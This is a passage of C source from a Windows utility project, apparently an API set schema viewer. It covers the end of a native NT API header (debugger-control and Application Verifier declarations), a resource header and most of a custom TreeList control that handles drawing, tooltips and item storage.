    BOOLEAN KernelDebuggerEnabled;
    BOOLEAN KernelDebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX {
    BOOLEAN DebuggerAllowed;
    BOOLEAN DebuggerEnabled;
    BOOLEAN DebuggerPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION_EX;

typedef enum _SYSDBG_COMMAND {
    SysDbgQueryModuleInformation,
    SysDbgQueryTraceInformation,
    SysDbgSetTracepoint,
    SysDbgSetSpecialCall,
    SysDbgClearSpecialCalls,
    SysDbgQuerySpecialCalls,
    SysDbgBreakPoint,
    SysDbgQueryVersion,
    SysDbgReadVirtual,
    SysDbgWriteVirtual,
    SysDbgReadPhysical,
    SysDbgWritePhysical,
    SysDbgReadControlSpace,
    SysDbgWriteControlSpace,
    SysDbgReadIoSpace,
    SysDbgWriteIoSpace,
    SysDbgReadMsr,
    SysDbgWriteMsr,
    SysDbgReadBusData,
    SysDbgWriteBusData,
    SysDbgCheckLowMemory,
    SysDbgEnableKernelDebugger,
    SysDbgDisableKernelDebugger,
    SysDbgGetAutoKdEnable,
    SysDbgSetAutoKdEnable,
    SysDbgGetPrintBufferSize,
    SysDbgSetPrintBufferSize,
    SysDbgGetKdUmExceptionEnable,
    SysDbgSetKdUmExceptionEnable,
    SysDbgGetTriageDump,
    SysDbgGetKdBlockEnable,
    SysDbgSetKdBlockEnable,
    SysDbgRegisterForUmBreakInfo,
    SysDbgGetUmBreakPid,
    SysDbgClearUmBreakPid,
    SysDbgGetUmAttachPid,
    SysDbgClearUmAttachPid,
    SysDbgGetLiveKernelDump
} SYSDBG_COMMAND, *PSYSDBG_COMMAND;

typedef struct _SYSDBG_VIRTUAL {
    PVOID Address;
    PVOID Buffer;
    ULONG Request;
} SYSDBG_VIRTUAL, *PSYSDBG_VIRTUAL;

NTSTATUS NTAPI NtSystemDebugControl(
    _In_ SYSDBG_COMMAND Command,
    _Inout_updates_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength,
    _Out_opt_ PULONG ReturnLength);

/************************************************************************************
*
* Application Verifier API and definitions.
*
************************************************************************************/

#ifndef DLL_PROCESS_VERIFIER
#define DLL_PROCESS_VERIFIER 4
#endif

typedef VOID(NTAPI *RTL_VERIFIER_DLL_LOAD_CALLBACK)(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved);

typedef VOID(NTAPI *RTL_VERIFIER_DLL_UNLOAD_CALLBACK)(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved);

typedef VOID(NTAPI *RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK)(
    PVOID AllocationBase,
    SIZE_T AllocationSize);

typedef struct _RTL_VERIFIER_THUNK_DESCRIPTOR {
    PCHAR ThunkName;
    PVOID ThunkOldAddress;
    PVOID ThunkNewAddress;
} RTL_VERIFIER_THUNK_DESCRIPTOR, *PRTL_VERIFIER_THUNK_DESCRIPTOR;

typedef struct _RTL_VERIFIER_DLL_DESCRIPTOR {
    PWCHAR DllName;
    DWORD DllFlags;
    PVOID DllAddress;
    PRTL_VERIFIER_THUNK_DESCRIPTOR DllThunks;
} RTL_VERIFIER_DLL_DESCRIPTOR, *PRTL_VERIFIER_DLL_DESCRIPTOR;

typedef struct _RTL_VERIFIER_PROVIDER_DESCRIPTOR {
    DWORD Length;
    PRTL_VERIFIER_DLL_DESCRIPTOR ProviderDlls;
    RTL_VERIFIER_DLL_LOAD_CALLBACK ProviderDllLoadCallback;
    RTL_VERIFIER_DLL_UNLOAD_CALLBACK ProviderDllUnloadCallback;
    PWSTR VerifierImage;
    DWORD VerifierFlags;
    DWORD VerifierDebug;
    PVOID RtlpGetStackTraceAddress;
    PVOID RtlpDebugPageHeapCreate;
    PVOID RtlpDebugPageHeapDestroy;
    RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK ProviderNtdllHeapFreeCallback;
} RTL_VERIFIER_PROVIDER_DESCRIPTOR, *PRTL_VERIFIER_PROVIDER_DESCRIPTOR;

//
// Application verifier standard flags.
//
#define RTL_VRF_FLG_FULL_PAGE_HEAP                   0x00000001
#define RTL_VRF_FLG_RESERVED_DONOTUSE                0x00000002
#define RTL_VRF_FLG_HANDLE_CHECKS                    0x00000004
#define RTL_VRF_FLG_STACK_CHECKS                     0x00000008
#define RTL_VRF_FLG_APPCOMPAT_CHECKS                 0x00000010
#define RTL_VRF_FLG_TLS_CHECKS                       0x00000020
#define RTL_VRF_FLG_DIRTY_STACKS                     0x00000040
#define RTL_VRF_FLG_RPC_CHECKS                       0x00000080
#define RTL_VRF_FLG_COM_CHECKS                       0x00000100
#define RTL_VRF_FLG_DANGEROUS_APIS                   0x00000200
#define RTL_VRF_FLG_RACE_CHECKS                      0x00000400
#define RTL_VRF_FLG_DEADLOCK_CHECKS                  0x00000800
#define RTL_VRF_FLG_FIRST_CHANCE_EXCEPTION_CHECKS    0x00001000
#define RTL_VRF_FLG_VIRTUAL_MEM_CHECKS               0x00002000
#define RTL_VRF_FLG_ENABLE_LOGGING                   0x00004000
#define RTL_VRF_FLG_FAST_FILL_HEAP                   0x00008000
#define RTL_VRF_FLG_VIRTUAL_SPACE_TRACKING           0x00010000
#define RTL_VRF_FLG_ENABLED_SYSTEM_WIDE              0x00020000
#define RTL_VRF_FLG_MISCELLANEOUS_CHECKS             0x00020000
#define RTL_VRF_FLG_LOCK_CHECKS                      0x00040000

VOID NTAPI RtlApplicationVerifierStop(
    _In_ ULONG_PTR Code,
    _In_ PSTR Message,
    _In_ ULONG_PTR Param1,
    _In_ PSTR Description1,
    _In_ ULONG_PTR Param2,
    _In_ PSTR Description2,
    _In_ ULONG_PTR Param3,
    _In_ PSTR Description3,
    _In_ ULONG_PTR Param4,
    _In_ PSTR Description4);

#ifndef VERIFIER_STOP
#define VERIFIER_STOP(Code, Msg, P1, S1, P2, S2, P3, S3, P4, S4) {  \
        RtlApplicationVerifierStop ((Code),                         \
                                    (Msg),                          \
                                    (ULONG_PTR)(P1),(S1),           \
                                    (ULONG_PTR)(P2),(S2),           \
                                    (ULONG_PTR)(P3),(S3),           \
                                    (ULONG_PTR)(P4),(S4));          \
  }
#endif

#pragma warning(pop)

#endif NTOS_RTL

```

`source/ApiSetSchema/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Resource.rc
//
#define IDD_ASDIALOG                    101
#define IDI_ICON_MAIN                   103
#define IDC_SEARCH_EDIT                 1001
#define IDC_SEARCH_BUTTON               1002
#define IDC_ENTRY_EDIT                  1003

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        104
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1003
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`source/ApiSetSchema/treelist.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2018
*
*  TITLE:       TREELIST.C
*
*  VERSION:     1.27
*
*  DATE:        31 Mar 2018
*
*  TreeList control.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#define OEMRESOURCE
#include <Windows.h>
#include <Windowsx.h>
#include <CommCtrl.h>
#include <Uxtheme.h>
#include <vsstyle.h>
#include <vssym32.h>
#include "treelist.h"
#include "minirtl\minirtl.h"
#pragma comment(lib, "Uxtheme.lib")

HTHEME  tl_theme = NULL;

VOID AddTooltipItemSub(
    HWND TreeControl,
    HWND ToolTips,
    UINT_PTR itemid,
    UINT_PTR lParam,
    LPRECT rect
)
{
    TOOLINFO tool;
    RtlSecureZeroMemory(&tool, sizeof(tool));

#ifdef UNICODE
    tool.cbSize = TTTOOLINFOW_V2_SIZE;
#else
    tool.cbSize = TTTOOLINFOA_V2_SIZE;
#endif // UNICODE

    tool.uFlags = TTF_SUBCLASS | TTF_TRANSPARENT;
    tool.uId = itemid;
    tool.hwnd = TreeControl;
    tool.lParam = lParam;
    tool.rect = *rect;
    tool.lpszText = LPSTR_TEXTCALLBACK;
    SendMessage(ToolTips, TTM_ADDTOOL, 0, (LPARAM)&tool);
}

VOID TreeListUpdateTooltips(
    HWND hwndTreeList
)
{
    PTL_SUBITEMS    subitems;
    RECT            rc, subrc, treerc;
    TOOLINFO        tool;
    ULONG           ToolCount, newToolId;
    SIZE_T          i;
    LONG            cx;
    TVITEMEX        itemex;
    HWND            TreeControl = (HWND)GetWindowLongPtr(hwndTreeList, TL_TREECONTROL_SLOT),
        ToolTips = (HWND)GetWindowLongPtr(hwndTreeList, TL_TOOLTIPS_SLOT),
        Header = (HWND)GetWindowLongPtr(hwndTreeList, TL_HEADERCONTROL_SLOT);
    HTREEITEM       item = TreeView_GetRoot(TreeControl);

    ToolCount = (ULONG)SendMessage(ToolTips, TTM_GETTOOLCOUNT, 0, 0);
    RtlSecureZeroMemory(&tool, sizeof(tool));
    tool.cbSize = sizeof(tool);

    for (i = 0; i < ToolCount; i++)
    {
        if (SendMessage(ToolTips, TTM_ENUMTOOLS, 0, (LPARAM)&tool))
            SendMessage(ToolTips, TTM_DELTOOL, 0, (LPARAM)&tool);
    }

    GetClientRect(TreeControl, &treerc);
    Header_GetItemRect(Header, 0, &rc);
    cx = rc.right;
    ToolCount = 0;

    while (item) {
        while (TreeView_GetItemRect(TreeControl, item, &rc, TRUE))
        {
            RtlSecureZeroMemory(&itemex, sizeof(itemex));
            itemex.hItem = item;
            itemex.mask = TVIF_HANDLE | TVIF_PARAM;
            TreeView_GetItem(TreeControl, &itemex);

            if (rc.right > cx)
                rc.right = cx;

            if ((rc.bottom < 0) || (rc.top >= treerc.bottom))
                break;

            newToolId = ToolCount++;
            AddTooltipItemSub(TreeControl, ToolTips, newToolId, (UINT_PTR)item, &rc);

            if (!itemex.lParam)
                break;

            subitems = (PTL_SUBITEMS)itemex.lParam;
            for (i = 0; i < subitems->Count; i++) {

                if (!Header_GetItemRect(Header, i + 1, &subrc))
                    break;

                subrc.top = rc.top;
                subrc.bottom = rc.bottom;
                AddTooltipItemSub(TreeControl, ToolTips, (0x1000 * (i + 1)) + newToolId, (UINT_PTR)item, &subrc);
            }

            break;
        }
        item = TreeView_GetNextVisible(TreeControl, item);
    }
}

LRESULT TreeListCustomDraw(
    HWND hwndHeader,
    LPNMTVCUSTOMDRAW pdraw
)
{
    TCHAR           textbuf[MAX_PATH];
    TVITEMEX        item;
    HDITEM          hdritem;
    HBRUSH          brush;
    HPEN            pen;
    RECT            hr, ir, subr;
    SIZE            tsz;
    LONG            i, ColumnCount, cx;
    PTL_SUBITEMS    subitem;
    HGDIOBJ         prev;
    BOOL            ItemSelected, first_iter = TRUE;
    HIMAGELIST      ImgList;
    HTREEITEM       iparent;

    if ((pdraw->nmcd.dwDrawStage & CDDS_ITEM) == 0)
        return CDRF_NOTIFYITEMDRAW;

    ItemSelected = pdraw->nmcd.uItemState & CDIS_FOCUS;

    RtlSecureZeroMemory(&item, sizeof(item));
    RtlSecureZeroMemory(&textbuf, sizeof(textbuf));
    item.mask = TVIF_TEXT | TVIF_HANDLE | TVIF_PARAM | TVIF_CHILDREN | TVIF_STATE | TVIF_IMAGE;
    item.hItem = (HTREEITEM)pdraw->nmcd.dwItemSpec;
    item.cchTextMax = (sizeof(textbuf) / sizeof(TCHAR)) - 1;
    item.pszText = textbuf;
    TreeView_GetItem(pdraw->nmcd.hdr.hwndFrom, &item);
    subitem = (PTL_SUBITEMS)item.lParam;

    TreeView_GetItemRect(pdraw->nmcd.hdr.hwndFrom, (HTREEITEM)pdraw->nmcd.dwItemSpec, &ir, TRUE);
    ImgList = TreeView_GetImageList(pdraw->nmcd.hdr.hwndFrom, TVSIL_NORMAL);

    if ((GetWindowLongPtr(GetParent(hwndHeader), GWL_STYLE) & TLSTYLE_LINKLINES))
    {
        iparent = (HTREEITEM)pdraw->nmcd.dwItemSpec;
        cx = ir.left - 11;

        while (iparent != NULL) {

            if (TreeView_GetNextSibling(pdraw->nmcd.hdr.hwndFrom, iparent) == NULL)
            {
                if (first_iter)
                {
                    for (i = 0; i < (ir.bottom - ir.top) / 2; i += 2)
                        SetPixel(pdraw->nmcd.hdc, cx, ir.top + i, 0xe0b0b0);
                }
            }
            else
            {
                for (i = ir.top; i < ir.bottom; i += 2)
                    SetPixel(pdraw->nmcd.hdc, cx, i, 0xe0b0b0);
            }

            first_iter = FALSE;
            cx -= 19;
            iparent = TreeView_GetParent(pdraw->nmcd.hdr.hwndFrom, iparent);
        }

        if (textbuf[0] != 0)
        {
            cx = 1 + ir.top + (ir.bottom - ir.top) / 2;
            for (i = ir.left - 11; i < ir.left; i += 2)
                SetPixel(pdraw->nmcd.hdc, i, cx, 0xe0b0b0);
        }
    }

    if (ImgList != NULL)
        ImageList_Draw(ImgList, item.iImage, pdraw->nmcd.hdc, ir.left - 18, ir.top, ILD_NORMAL);

    if (item.cChildren == 1) // msdn: The item has one or more child items.
    {
        RtlSecureZeroMemory(&tsz, sizeof(tsz));
        if (GetThemePartSize(tl_theme, pdraw->nmcd.hdc, TVP_GLYPH, GLPS_CLOSED, NULL, TS_TRUE, &tsz) != S_OK) {
            tsz.cx = 8;
            tsz.cy = 8;
        }

        subr.top = ir.top + (((ir.bottom - ir.top) - tsz.cy) / 2);
        subr.bottom = subr.top + tsz.cy;
        subr.left = ir.left - tsz.cx - 3;

        if (ImgList != NULL)
            subr.left -= 38;

        subr.right = ir.left - 3;

        if ((item.state & TVIS_EXPANDED) == 0)
            i = GLPS_CLOSED;
        else
            i = GLPS_OPENED;

        FillRect(pdraw->nmcd.hdc, &subr, WHITE_BRUSH);
        DrawThemeBackground(tl_theme, pdraw->nmcd.hdc, TVP_GLYPH, i, &subr, NULL);
    }

    cx = 0;
    ColumnCount = Header_GetItemCount(hwndHeader);
    for (i = 0; i < ColumnCount; i++) {
        RtlSecureZeroMemory(&hr, sizeof(hr));
        Header_GetItemRect(hwndHeader, i, &hr);
        if (hr.right > cx)
            cx = hr.right;
    }

    if (subitem && ItemSelected == 0) {
        if (subitem->ColorFlags & TLF_BGCOLOR_SET) {
            pdraw->clrTextBk = subitem->BgColor;
            SetBkColor(pdraw->nmcd.hdc, subitem->BgColor);
        }

        if (subitem->ColorFlags & TLF_FONTCOLOR_SET) {
            pdraw->clrText = subitem->FontColor;
            SetTextColor(pdraw->nmcd.hdc, subitem->FontColor);
        }
    }

    brush = CreateSolidBrush(pdraw->clrTextBk);
    subr.top = ir.top;
    subr.bottom = ir.bottom - 1;
    subr.left = ir.left;
    subr.right = cx;
    FillRect(pdraw->nmcd.hdc, &subr, brush);
    DeleteObject(brush);

    if (!ItemSelected) {
        for (i = 1; i < ColumnCount; i++) {
            RtlSecureZeroMemory(&hr, sizeof(hr));
            Header_GetItemRect(hwndHeader, i, &hr);

            RtlSecureZeroMemory(&hdritem, sizeof(hdritem));
            hdritem.mask = HDI_LPARAM;
            Header_GetItem(hwndHeader, i, &hdritem);

            if (hdritem.lParam != 0)
            {
                brush = CreateSolidBrush((COLORREF)hdritem.lParam);
                subr.top = ir.top;
                subr.bottom = ir.bottom - 1;
                subr.left = hr.left;
                subr.right = hr.right;
                FillRect(pdraw->nmcd.hdc, &subr, brush);
                DeleteObject(brush);
            }
        }
    }

    Header_GetItemRect(hwndHeader, 0, &hr);
    subr.right = hr.right - 3;
    subr.left = ir.left + 3;
    DrawText(pdraw->nmcd.hdc, textbuf, -1, &subr, DT_END_ELLIPSIS | DT_VCENTER | DT_SINGLELINE);

    ir.right = cx;

    pen = CreatePen(PS_SOLID, 1, 0xfbf3e5);// GetSysColor(COLOR_MENUBAR));
    prev = SelectObject(pdraw->nmcd.hdc, pen);

    for (i = 0; i < ColumnCount; i++) {
        RtlSecureZeroMemory(&hr, sizeof(hr));
        Header_GetItemRect(hwndHeader, i, &hr);

        RtlSecureZeroMemory(&hdritem, sizeof(hdritem));
        hdritem.mask = HDI_LPARAM;
        Header_GetItem(hwndHeader, i, &hdritem);

        if ((i > 0) && subitem)
            if (i <= (LONG)subitem->Count)
                if (subitem->Text[i - 1]) {
                    subr.top = ir.top;
                    subr.bottom = ir.bottom;
                    subr.left = hr.left + 3;
                    subr.right = hr.right - 3;

                    if (!ItemSelected)
                    {
                        if (subitem->ColorFlags & TLF_BGCOLOR_SET) {
                            pdraw->clrTextBk = subitem->BgColor;
                            SetBkColor(pdraw->nmcd.hdc, subitem->BgColor);
                        }

                        if (hdritem.lParam != 0)
                            SetBkColor(pdraw->nmcd.hdc, (COLORREF)hdritem.lParam);
                    }

                    DrawText(pdraw->nmcd.hdc, subitem->Text[i - 1], -1, &subr, DT_END_ELLIPSIS | DT_VCENTER | DT_SINGLELINE);
                }

        MoveToEx(pdraw->nmcd.hdc, hr.left, ir.bottom - 1, NULL);
        LineTo(pdraw->nmcd.hdc, hr.right - 1, ir.bottom - 1);
        LineTo(pdraw->nmcd.hdc, hr.right - 1, ir.top - 1);
    }

    SelectObject(pdraw->nmcd.hdc, prev);
    DeleteObject(pen);

    if ((pdraw->nmcd.uItemState & CDIS_FOCUS) != 0)
        DrawFocusRect(pdraw->nmcd.hdc, &ir);

    return CDRF_SKIPDEFAULT;
}

VOID TreeListHandleHeaderNotify(
    HWND hwndBox,
    HWND hwndTree,
    HWND hwndHeader
)
{
    SCROLLINFO  scroll;
    LONG        cx, i, c, headerheight;
    RECT        hr, ir;

    RtlSecureZeroMemory(&hr, sizeof(hr));
    GetWindowRect(hwndHeader, &hr);
    headerheight = hr.bottom - hr.top;

    cx = 0;
    c = Header_GetItemCount(hwndHeader);
    for (i = 0; i < c; i++) {
        Header_GetItemRect(hwndHeader, i, &hr);
        if (hr.right > cx)
            cx = hr.right;
    }

    GetClientRect(hwndBox, &hr);
    if (cx > hr.right) {
        RtlSecureZeroMemory(&scroll, sizeof(scroll));
        scroll.cbSize = sizeof(scroll);
        scroll.fMask = SIF_ALL;
        GetScrollInfo(hwndBox, SB_HORZ, &scroll);

        GetClientRect(hwndHeader, &ir);
        if ((ir.right > cx) && (scroll.nPos + (int)scroll.nPage == scroll.nMax)) {
            SetWindowPos(hwndHeader, 0, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
            SetWindowPos(hwndTree, 0, 0, headerheight, hr.right, hr.bottom - headerheight, SWP_NOZORDER);
            scroll.nPos = 0;
        }

        scroll.nMax = cx;
        scroll.nPage = hr.right;
        SetScrollInfo(hwndBox, SB_HORZ, &scroll, TRUE);
        GetClientRect(hwndBox, &hr);
        GetWindowRect(hwndTree, &ir);
        ir.right -= ir.left;
        SetWindowPos(hwndTree, 0, 0, 0, ir.right, hr.bottom - headerheight, SWP_NOMOVE | SWP_NOZORDER);
        SetWindowPos(hwndHeader, 0, 0, 0, cx, headerheight, SWP_NOMOVE | SWP_NOZORDER);
    }
    else {
        ShowScrollBar(hwndBox, SB_HORZ, FALSE);
        GetClientRect(hwndBox, &hr);
        SetWindowPos(hwndHeader, 0, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
        SetWindowPos(hwndTree, 0, 0, headerheight, hr.right, hr.bottom - headerheight, SWP_NOZORDER);
    }
    RedrawWindow(hwndTree, NULL, NULL, RDW_INVALIDATE | RDW_NOERASE);
}

VOID TreeListAutoExpand(
    HWND hwndHeader,
    LPNMTREEVIEW nhdr
)
{
    RECT        irc;
    LONG        cx = 0, xleft = 0;
    HDITEM      hdi;
    HTREEITEM   citem = TreeView_GetChild(nhdr->hdr.hwndFrom, nhdr->itemNew.hItem);

    RtlSecureZeroMemory(&irc, sizeof(irc));
    TreeView_GetItemRect(nhdr->hdr.hwndFrom, citem, &irc, TRUE);
    xleft = irc.left;

    while (citem) {
        RtlSecureZeroMemory(&irc, sizeof(irc));
        TreeView_GetItemRect(nhdr->hdr.hwndFrom, citem, &irc, TRUE);

        if (irc.left < xleft)
            break;

        if (irc.right > cx)
            cx = irc.right;

        citem = TreeView_GetNextVisible(nhdr->hdr.hwndFrom, citem);
    }

    RtlSecureZeroMemory(&hdi, sizeof(hdi));
    hdi.mask = HDI_WIDTH;
    Header_GetItem(hwndHeader, 0, &hdi);

    if (hdi.cxy < cx + 8)
        hdi.cxy = cx + 8;

    Header_SetItem(hwndHeader, 0, &hdi);
}

LRESULT CALLBACK HeaderHookProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
)
{
    HWND        BaseWindow = GetParent(hwnd);
    WNDPROC     OriginalTreeProc = (WNDPROC)GetWindowLongPtr(BaseWindow, TL_HEADERWNDPROC_SLOT);
    HDC         dc;
    LRESULT     retv;
    RECT        rc;
    HPEN        pen, prev;

    retv = OriginalTreeProc(hwnd, uMsg, wParam, lParam);
    if (uMsg != WM_PAINT)
        return retv;

    GetClientRect(hwnd, &rc);
    --rc.bottom;

    dc = GetDC(hwnd);
    pen = CreatePen(PS_SOLID, 1, 0xfbf3e5);
    prev = (HPEN)SelectObject(dc, (HGDIOBJ)pen);

    MoveToEx(dc, 0, rc.bottom, NULL);
    LineTo(dc, rc.right, rc.bottom);

    SelectObject(dc, prev);
    ReleaseDC(hwnd, dc);
    DeleteObject(pen);

    return retv;
}

LRESULT CALLBACK TreeListHookProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
)
{
    HWND            BaseWindow = GetParent(hwnd);
    WNDPROC         OriginalTreeProc = (WNDPROC)GetWindowLongPtr(BaseWindow, TL_TREEWNDPROC_SLOT);
    LPNMTTDISPINFO  hdr;
    LPTSTR          privateBuffer;
    TVITEMEX        itemex;
    RECT            rc, hr;
    PTL_SUBITEMS    subitems;
    TOOLINFO        tool;
    HDC             dc;
    ULONG_PTR       subid;

    switch (uMsg) {
    case WM_NOTIFY:
        hdr = (LPNMTTDISPINFO)lParam;
        if (hdr->hdr.hwndFrom == (HWND)GetWindowLongPtr(BaseWindow, TL_TOOLTIPS_SLOT)) {
            switch (hdr->hdr.code) {
            case TTN_SHOW:

                RtlSecureZeroMemory(&tool, sizeof(tool));
                tool.cbSize = sizeof(tool);
                tool.uId = hdr->hdr.idFrom;
                tool.hwnd = hwnd;
                SendMessage(hdr->hdr.hwndFrom, TTM_GETTOOLINFO, 0, (LPARAM)&tool);

                if (TreeView_GetItemRect(hwnd, (HTREEITEM)tool.lParam, &rc, TRUE)) {

                    subid = (tool.uId & ((ULONG_PTR)~0xfff)) >> 12;
                    if (subid > 0) {
                        Header_GetItemRect((HWND)GetWindowLongPtr(BaseWindow, TL_HEADERCONTROL_SLOT), subid, &hr);
                        rc.left = hr.left;
                        rc.right = hr.right;
                    }

                    rc.left += 3;
                    rc.top += 1;

                    ClientToScreen(hwnd, (LPPOINT)&rc);
                    SendMessage(hdr->hdr.hwndFrom, TTM_ADJUSTRECT, TRUE, (LPARAM)&rc);
                    SetWindowPos(hdr->hdr.hwndFrom, 0, rc.left, rc.top, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE | SWP_NOREDRAW);
                    return TRUE;
                }
                break;

            case TTN_GETDISPINFO:

                subid = (hdr->hdr.idFrom & ((ULONG_PTR)~0xfff)) >> 12;
                if (!Header_GetItemRect((HWND)GetWindowLongPtr(BaseWindow, TL_HEADERCONTROL_SLOT), subid, &hr))
                    break;

                if (!TreeView_GetItemRect(hwnd, (HTREEITEM)hdr->lParam, &rc, TRUE))
                    break;

                if ((subid == 0) && (rc.right < hr.right - 1)) // is tooltip from the first column?
                    break;

                privateBuffer = (LPTSTR)GetWindowLongPtr(BaseWindow, TL_TOOLTIPSBUFFER_SLOT);
                privateBuffer[0] = 0;

                RtlSecureZeroMemory(&itemex, sizeof(itemex));
                itemex.mask = TVIF_TEXT | TVIF_HANDLE | TVIF_PARAM;
                itemex.cchTextMax = MAX_PATH;
                itemex.pszText = privateBuffer;
                itemex.hItem = (HTREEITEM)hdr->lParam;
                TreeView_GetItem(hwnd, &itemex);

                if ((subid > 0) && (itemex.lParam != 0)) {
                    subitems = (PTL_SUBITEMS)itemex.lParam;

                    rc.left = hr.left + 3;
                    rc.right = hr.right - 3;

                    dc = GetDC(hwnd);
                    SelectObject(dc, (HGDIOBJ)SendMessage(hwnd, WM_GETFONT, 0, 0));

                    /*fake DrawText for calculating bounding rectangle*/
                    DrawText(dc, subitems->Text[subid - 1], -1, &rc, DT_VCENTER | DT_SINGLELINE | DT_CALCRECT);

                    ReleaseDC(hwnd, dc);

                    if (rc.right < hr.right - 2)
                        break;

                    _strncpy(privateBuffer, MAX_PATH, subitems->Text[subid - 1], MAX_PATH);
                }

                hdr->lpszText = privateBuffer;

                break;
            }
        }
        break;

    case WM_PAINT:

        TreeListUpdateTooltips(BaseWindow);
        break;
    }

    return OriginalTreeProc(hwnd, uMsg, wParam, lParam);
}

PTL_SUBITEMS PackSubitems(HANDLE hHeap, IN PTL_SUBITEMS Subitems)
{
    PTL_SUBITEMS    newsubitems;
    size_t          strings_size, header_size;
    ULONG           i;
    LPTSTR          strings;

    /*
    size of header + variable length array .Text[1] part
    */
    header_size = sizeof(TL_SUBITEMS) + (Subitems->Count * sizeof(LPTSTR));

    /*
    total size of all strings including terminating zeros
    */

    strings_size = 0;
    for (i = 0; i < Subitems->Count; i++)
        strings_size += (_strlen(Subitems->Text[i]) + 1) * sizeof(TCHAR);

    newsubitems = (PTL_SUBITEMS)HeapAlloc(hHeap, 0, header_size + strings_size);
    if (!newsubitems)
        return NULL;

    strings = (LPTSTR)((PBYTE)newsubitems + header_size);

    newsubitems->UserParam = Subitems->UserParam;
    newsubitems->ColorFlags = Subitems->ColorFlags;
    newsubitems->BgColor = Subitems->BgColor;
    newsubitems->FontColor = Subitems->FontColor;
    newsubitems->Count = Subitems->Count;

    for (i = 0; i < Subitems->Count; i++) {
        newsubitems->Text[i] = strings;
        _strcpy(newsubitems->Text[i], Subitems->Text[i]);
        strings += _strlen(Subitems->Text[i]) + 1;
    }

    return newsubitems;
}

LRESULT CALLBACK TreeListWindowProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
)
{
    HWND            TreeControl, HeaderControl, ToolTip;
    PTL_SUBITEMS    subitems, *ppsubitems;
    TVHITTESTINFO   lhti;
    LONG            cx, headerheight;
    HANDLE          hheap;
    RECT            hr;
    HFONT           font;
    LPNMHEADER      hdr;
    SCROLLINFO      scroll;
    TVITEMEX        item;
    LRESULT         result;

    NONCLIENTMETRICS    ncm;
    TV_INSERTSTRUCT     ins;

    switch (uMsg) {

    case TVM_ENSUREVISIBLE:

        TreeControl = (HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT);
        SendMessage(TreeControl, TVM_ENSUREVISIBLE, 0, lParam);
        return SendMessage(TreeControl, TVM_SELECTITEM, TVGN_CARET, lParam);

        break;

    case TVM_GETITEM:

        if (wParam == 0)
            return 0;

        item = *((LPTVITEMEX)wParam);
        ppsubitems = (PTL_SUBITEMS *)lParam;

        if (ppsubitems)
            item.mask |= TVIF_PARAM;

        result = SendMessage((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT), TVM_GETITEM, 0, (LPARAM)&item);

        if (ppsubitems) {
            *ppsubitems = (PTL_SUBITEMS)item.lParam;
            item.lParam = 0;
            item.mask &= ~TVIF_PARAM;
        }

        *((LPTVITEMEX)wParam) = item;

        return result;

    case TVM_SETITEM:

        item = *((LPTVITEMEX)wParam);
        ppsubitems = (PTL_SUBITEMS *)lParam;

        hheap = (HANDLE)GetWindowLongPtr(hwnd, TL_HEAP_SLOT);
        if (!hheap)
            return 0;

        subitems = NULL;
        if (ppsubitems)
        {
            item.mask |= TVIF_PARAM;
            result = SendMessage((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT), TVM_GETITEM, 0, (LPARAM)&item);
            if (!result)
                return FALSE;

            item.mask |= TVIF_PARAM;
            subitems = (PTL_SUBITEMS)item.lParam;
            item.lParam = (LPARAM)PackSubitems(hheap, (PTL_SUBITEMS)lParam);
        }

        result = SendMessage((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT), TVM_SETITEM, 0, (LPARAM)&item);
        HeapFree(hheap, 0, subitems);
        return result;

    case TVM_INSERTITEM:

        if (wParam == 0)
            return 0;

        hheap = (HANDLE)GetWindowLongPtr(hwnd, TL_HEAP_SLOT);
        if (!hheap)
            return 0;

        ins = *((LPTV_INSERTSTRUCT)wParam);

        if (lParam) {
            ins.item.mask |= TVIF_PARAM;
            ins.item.lParam = (LPARAM)PackSubitems(hheap, (PTL_SUBITEMS)lParam);
        }
        else
            ins.item.lParam = 0;

        return SendMessage((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT), TVM_INSERTITEM, 0, (LPARAM)&ins);

    case HDM_INSERTITEM:

        return SendMessage((HWND)GetWindowLongPtr(hwnd, TL_HEADERCONTROL_SLOT), HDM_INSERTITEM, wParam, lParam);

    case TVM_GETNEXTITEM:

        return SendMessage((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT), TVM_GETNEXTITEM, wParam, lParam);

    case TVM_EXPAND:

